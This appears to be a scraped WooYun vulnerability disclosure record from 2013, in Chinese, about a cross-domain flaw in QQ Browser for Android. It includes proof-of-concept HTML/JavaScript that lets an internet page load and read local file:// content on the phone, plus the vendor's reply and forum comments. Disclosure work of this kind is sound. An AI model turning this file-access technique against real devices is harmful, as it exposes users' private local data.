{"id": 7732, "wybug_id": "wooyun-2013-040546", "wybug_title": "QQ 浏览器 for android 跨域漏洞", "wybug_corp": "腾讯", "wybug_author": "心伤的胖子", "wybug_date": "2013-10-21 17:17", "wybug_open_date": "2013-12-05 17:18", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-05：\t细节向公众公开  简要描述： QQ 浏览器 for android 在跨域实现上存在缺陷导致漏洞。 详细说明：  原则上从 internet 域禁止访问 file 域，但是 QQ 浏览器在实现上存在缺陷，造成可以从 internet 域访问到 file 域上的文件，如果 file 域上存在一个漏洞文件则可以获取手机端的敏感信息等。1、在手机上生成一个如下代码的 html 文件，位置随意，我这里放置到 /sdcard/ 目录下：\n<script type=\"text/javascript\">var request = false;if (window.XMLHttpRequest) {    request = new XMLHttpRequest();    if (request.overrideMimeType) {        request.overrideMimeType(\"text/xml\");    }} else if (window.ActiveXObject) {    var versions = [\"Microsoft.XMLHTTP\", \"MSXML.XMLHTTP\", \"Microsoft.XMLHTTP\", \"Msxml2.XMLHTTP.7.0\", \"Msxml2.XMLHTTP.6.0\", \"Msxml2.XMLHTTP.5.0\", \"Msxml2.XMLHTTP.4.0\", \"MSXML2.XMLHTTP.3.0\", \"MSXML2.XMLHTTP\"];    for (var i = 0; i < versions.length; i++) {        try {            request = new ActiveXObject(versions[i]);        } catch (e) {}    }}xmlhttp = request;xmlhttp.open(\"GET\", document.URL, false);xmlhttp.send(null);alert(xmlhttp.responseText);</script>\n2、在任意 internet 域下上传一个如下代码的 html 文件，比如 http://victim.com/ 下：\n<!DOCTYPE html><html><head><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><title>qq browser file vul</title><body><script type=\"text/javascript\"></script>sdcard file <br/><iframe src=\"file:///sdcard/qq.html\"></iframe></body></html>\n3、通过 http://victim.com/qq.html 进行访问，如下图\n\nPS：至于怎么在手机上放置一个存在漏洞的文件那又是另外一个问题了。   漏洞证明：  \n\n   修复方案：  1、限定 internet 域对 file 域的访问   版权声明：转载请注明来源 心伤的胖子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-10-21 17:27 厂商回复： 感谢反馈，该问题我们已经通过其他渠道知悉，目前正在紧急修复中，再次感谢你的报告。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-21 17:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  - - ||     \n     2013-10-21 17:30 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  果然是负分滚粗    \n     2013-10-21 17:41 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  好吧，哥负分滚粗！    \n     2013-10-21 18:08 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  企鹅....感谢反馈，该问题我们已经通过其他渠道知悉，目前正在紧急修复中，再次感谢你的报告。    \n     2013-10-21 18:16 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @心伤的胖子 是FireFox那个给你的提示么？    \n     2013-10-21 18:40 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @园长 傻逼腾讯 别的渠道知道的你给1分？    \n     2013-10-21 19:57 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  又有好东西看！强势围观！    \n     2013-10-21 20:28 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  该问题我们已经通过其他渠道知悉    \n     2013-10-21 20:54 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  腾迅这牛逼，咋不直接公开呢...    \n     2013-10-21 21:55 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  @疯狗 不是的呀，这种漏洞在以前 PC 端浏览器上不是经常出现么。     \n     2013-10-22 10:44 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @心伤的胖子 腾讯其他渠道好牛的说，你怎么看    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}